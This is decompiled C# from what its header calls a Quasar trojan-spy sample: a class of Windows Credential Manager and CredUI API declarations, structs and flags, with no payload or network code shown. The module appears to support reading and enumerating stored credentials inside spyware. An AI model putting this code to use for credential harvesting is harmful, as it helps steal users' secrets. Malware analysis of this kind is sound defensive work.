// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.CredentialManagement.NativeMethods
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using Microsoft.Win32.SafeHandles;
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace NoiseMe.Drags.App.Models.CredentialManagement
{
  public class NativeMethods
  {
    public const int CREDUI_MAX_USERNAME_LENGTH = 513;
    public const int CREDUI_MAX_PASSWORD_LENGTH = 256;
    public const int CREDUI_MAX_MESSAGE_LENGTH = 32767;
    public const int CREDUI_MAX_CAPTION_LENGTH = 128;

    [DllImport("Advapi32.dll", EntryPoint = "CredReadW", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool CredRead(
      string target,
      CredentialType type,
      int reservedFlag,
      out IntPtr CredentialPtr);

    [DllImport("Advapi32.dll", EntryPoint = "CredWriteW", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool CredWrite([In] ref NativeMethods.CREDENTIAL userCredential, [In] uint flags);

    [DllImport("Advapi32.dll", SetLastError = true)]
    public static extern bool CredFree([In] IntPtr cred);

    [DllImport("advapi32.dll", EntryPoint = "CredDeleteW", CharSet = CharSet.Unicode)]
    public static extern bool CredDelete(StringBuilder target, CredentialType type, int flags);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool CredEnumerateW(
      string filter,
      int flag,
      out uint count,
      out IntPtr pCredentials);

    [DllImport("credui.dll")]
    public static extern NativeMethods.CredUIReturnCodes CredUIPromptForCredentials(
      ref NativeMethods.CREDUI_INFO creditUR,
      string targetName,
      IntPtr reserved1,
      int iError,
      StringBuilder userName,
      int maxUserName,
      StringBuilder password,
      int maxPassword,
      [MarshalAs(UnmanagedType.Bool)] ref bool pfSave,
      int flags);

    [DllImport("credui.dll", CharSet = CharSet.Unicode)]
    public static extern NativeMethods.CredUIReturnCodes CredUIPromptForWindowsCredentials(
      ref NativeMethods.CREDUI_INFO notUsedHere,
      int authError,
      ref uint authPackage,
      IntPtr InAuthBuffer,
      uint InAuthBufferSize,
      out IntPtr refOutAuthBuffer,
      out uint refOutAuthBufferSize,
      ref bool fSave,
      int flags);

    [DllImport("ole32.dll")]
    public static extern void CoTaskMemFree(IntPtr ptr);

    [DllImport("credui.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool CredPackAuthenticationBuffer(
      int dwFlags,
      StringBuilder pszUserName,
      StringBuilder pszPassword,
      IntPtr pPackedCredentials,
      ref int pcbPackedCredentials);

    [DllImport("credui.dll", CharSet = CharSet.Auto)]
    public static extern bool CredUnPackAuthenticationBuffer(
      int dwFlags,
      IntPtr pAuthBuffer,
      uint cbAuthBuffer,
      StringBuilder pszUserName,
      ref int pcchMaxUserName,
      StringBuilder pszDomainName,
      ref int pcchMaxDomainame,
      StringBuilder pszPassword,
      ref int pcchMaxPassword);

    public struct CREDENTIAL
    {
      public int Flags;
      public int Type;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string TargetName;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string Comment;
      public long LastWritten;
      public int CredentialBlobSize;
      public IntPtr CredentialBlob;
      public int Persist;
      public int AttributeCount;
      public IntPtr Attributes;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string TargetAlias;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string UserName;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct CREDUI_INFO
    {
      public int cbSize;
      public IntPtr hwndParent;
      public string pszMessageText;
      public string pszCaptionText;
      public IntPtr hbmBanner;
    }

    [Flags]
    public enum WINXP_CREDUI_FLAGS
    {
      INCORRECT_PASSWORD = 1,
      DO_NOT_PERSIST = 2,
      REQUEST_ADMINISTRATOR = 4,
      EXCLUDE_CERTIFICATES = 8,
      REQUIRE_CERTIFICATE = 16, // 0x00000010
      SHOW_SAVE_CHECK_BOX = 64, // 0x00000040
      ALWAYS_SHOW_UI = 128, // 0x00000080
      REQUIRE_SMARTCARD = 256, // 0x00000100
      PASSWORD_ONLY_OK = 512, // 0x00000200
      VALIDATE_USERNAME = 1024, // 0x00000400
      COMPLETE_USERNAME = 2048, // 0x00000800
      PERSIST = 4096, // 0x00001000
      SERVER_CREDENTIAL = 16384, // 0x00004000
      EXPECT_CONFIRMATION = 131072, // 0x00020000
      GENERIC_CREDENTIALS = 262144, // 0x00040000
      USERNAME_TARGET_CREDENTIALS = 524288, // 0x00080000
      KEEP_USERNAME = 1048576, // 0x00100000
    }

    [Flags]
    public enum WINVISTA_CREDUI_FLAGS
    {
      CREDUIWIN_GENERIC = 1,
      CREDUIWIN_CHECKBOX = 2,
      CREDUIWIN_AUTHPACKAGE_ONLY = 16, // 0x00000010
      CREDUIWIN_IN_CRED_ONLY = 32, // 0x00000020
      CREDUIWIN_ENUMERATE_ADMINS = 256, // 0x00000100
      CREDUIWIN_ENUMERATE_CURRENT_USER = 512, // 0x00000200
      CREDUIWIN_SECURE_PROMPT = 4096, // 0x00001000
      CREDUIWIN_PACK_32_WOW = 268435456, // 0x10000000
    }

    public enum CredUIReturnCodes
    {
      NO_ERROR = 0,
      ERROR_INVALID_PARAMETER = 87, // 0x00000057
      ERROR_INSUFFICIENT_BUFFER = 122, // 0x0000007A
      ERROR_BAD_ARGUMENTS = 160, // 0x000000A0
      ERROR_INVALID_FLAGS = 1004, // 0x000003EC
      ERROR_NOT_FOUND = 1168, // 0x00000490
      ERROR_CANCELLED = 1223, // 0x000004C7
      ERROR_NO_SUCH_LOGON_SESSION = 1312, // 0x00000520
      ERROR_INVALID_ACCOUNT_NAME = 1315, // 0x00000523
    }

    public enum CREDErrorCodes
    {
      SCARD_E_NO_SMARTCARD = -2146435060, // 0x8010000C
      SCARD_E_NO_READERS_AVAILABLE = -2146435026, // 0x8010002E
      SCARD_W_REMOVED_CARD = -2146434967, // 0x80100069
      SCARD_W_WRONG_CHV = -2146434965, // 0x8010006B
      NO_ERROR = 0,
      ERROR_INVALID_PARAMETER = 87, // 0x00000057
      ERROR_INVALID_FLAGS = 1004, // 0x000003EC
      ERROR_NOT_FOUND = 1168, // 0x00000490
      ERROR_NO_SUCH_LOGON_SESSION = 1312, // 0x00000520
      ERROR_BAD_USERNAME = 2202, // 0x0000089A
    }

    public sealed class CriticalCredentialHandle : CriticalHandleZeroOrMinusOneIsInvalid
    {
      public CriticalCredentialHandle(IntPtr preexistingHandle) => this.SetHandle(preexistingHandle);

      public NativeMethods.CREDENTIAL GetCredential()
      {
        if (!this.IsInvalid)
          return (NativeMethods.CREDENTIAL) Marshal.PtrToStructure(this.handle, typeof (NativeMethods.CREDENTIAL));
        throw new InvalidOperationException("Invalid CriticalHandle!");
      }

      protected override bool ReleaseHandle()
      {
        if (this.IsInvalid)
          return false;
        NativeMethods.CredFree(this.handle);
        this.SetHandleAsInvalid();
        return true;
      }
    }
  }
}
